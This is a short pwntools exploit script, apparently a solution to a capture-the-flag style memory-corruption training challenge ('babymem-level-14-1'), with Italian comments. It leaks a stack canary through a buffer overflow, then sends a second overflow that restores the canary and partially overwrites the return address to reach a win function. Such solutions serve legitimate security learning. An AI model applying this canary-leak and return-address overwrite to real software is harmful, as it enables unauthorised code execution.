from pwn import * 

elf = ELF("/challenge/babymem-level-14-1")
io = elf.process()

b_offset = int("1f8", 16)
b_size = 488
win_func = b"\x04" + b"\x20"

# Trovata guardando lo stack su gdb, dal buffer controlli i valori all'interno, ho cercato quello che assomigliava ad una canary
canary_offset = 216 + 1          # Ha sempre uno \x00 alla fine?

k = b"REPEAT"

p1 = k + b'A'*(canary_offset - len(k))

io.sendline(f"{len(p1)}")
io.sendline(p1)

io.recvuntil(p1)
can_val = io.recvuntil("\n")
can_val = b"\x00" + can_val[:7]

p2 = b"A"*(b_offset - 16) + can_val + b"B"*8 + win_func

io.sendline(f"{len(p2)}")
io.sendline(p2)

io.interactive()
